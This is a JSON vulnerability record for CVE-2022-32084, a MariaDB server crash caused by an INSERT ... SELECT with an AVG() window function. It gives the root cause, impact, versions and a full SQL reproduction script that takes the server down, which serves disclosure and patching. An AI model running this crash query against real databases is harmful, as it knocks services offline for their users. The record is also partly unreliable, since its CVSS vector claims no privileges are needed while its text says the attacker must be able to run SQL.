```
{
  "CVE-2022-32084": {
    "description": "MariaDB Server SEGV on INSERT .. SELECT",
    "root_cause": "A crash occurs due to an issue in the sub_select function related to window functions and specific SQL queries. The crash happens during the execution of an INSERT INTO ... SELECT query that uses an AVG() window function with a complex partition by clause.",
    "weaknesses": [
      "A specific combination of SQL query elements, including window functions, can trigger a server crash."
    ],
    "impact": "Denial of Service (DoS). The server crashes and becomes unavailable.",
    "attack_vectors": "Sending a specially crafted SQL query to the MariaDB server.",
      "required_attacker_capabilities": "The attacker needs the ability to execute arbitrary SQL queries on a vulnerable MariaDB instance.",
    "details": "The provided SQL to reproduce the crash is:\n\n```sql\nCREATE TABLE v0 ( v1 DECIMAL UNIQUE CHECK ( CASE 0 * 27302337.000000 WHEN 34 THEN + 'x' LIKE 'x' OR v1 NOT IN ( -1 / TRUE ^ 2 ) ELSE 7105743.000000 END ) ) ;\nINSERT INTO v0 VALUES ( 90 ) , ( -1 ) , ( 31152443.000000 ) , ( -32768 ) , ( NULL ) , ( NULL ) ;\nINSERT INTO v0 SELECT AVG ( 'x' ) OVER ( PARTITION BY ( ( NOT AVG ( 76698761.000000 ) ) ) IS NOT NULL ) ;\nINSERT IGNORE INTO v0 ( ) VALUES ( 0 ) , ( 'x' ) , ( 3751286.000000 ) , ( 'x' ) , ( ( v1 = 'x' AND 0 AND 0 ) ) ;\nINSERT INTO v0 VALUES ( 127 ) ;\nINSERT INTO v0 SELECT -2147483648 END FROM v0 AS TEXT JOIN v0 JOIN v0 TABLES ;\nALTER TABLE v0 ADD ( v2 INT UNIQUE CHECK ( ( v1 = 'x' AND ( ( - ( + ( BINARY 49730460.000000 ) ) ) ) = 'x' BETWEEN 'x' AND 'x' ) ) ) ;\nUPDATE v0 SET v1 = -128 WHERE v1 IS NULL ORDER BY 78 IN ( 'x' , 'x' ) , v1 ; \n```\n\nThe specific line causing the crash is:\n`INSERT INTO v0 SELECT AVG ( 'x' ) OVER ( PARTITION BY ( ( NOT AVG ( 76698761.000000 ) ) ) IS NOT NULL ) ;`\n\nThe crash occurs within the `sub_select` function, as shown in the stack trace: `sub_select (join=0x629000089208, join_tab=0x629000089c88, end_of_records=false) at /experiment/mariadb-server/sql/sql_select.cc:21052`",
    "affected_versions": [
      "10.7.0",
      "10.2 (EOL)",
      "10.3 (EOL)",
      "10.4 (EOL)",
      "10.5",
      "10.6",
       "10.7 (EOL)",
       "10.8 (EOL)"
    ],
    "fixed_versions": [
      "10.3.36",
      "10.4.26",
      "10.5.17",
      "10.6.9",
      "10.7.5",
      "10.8.4",
      "10.9.2"
    ],
      "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
  }
}
```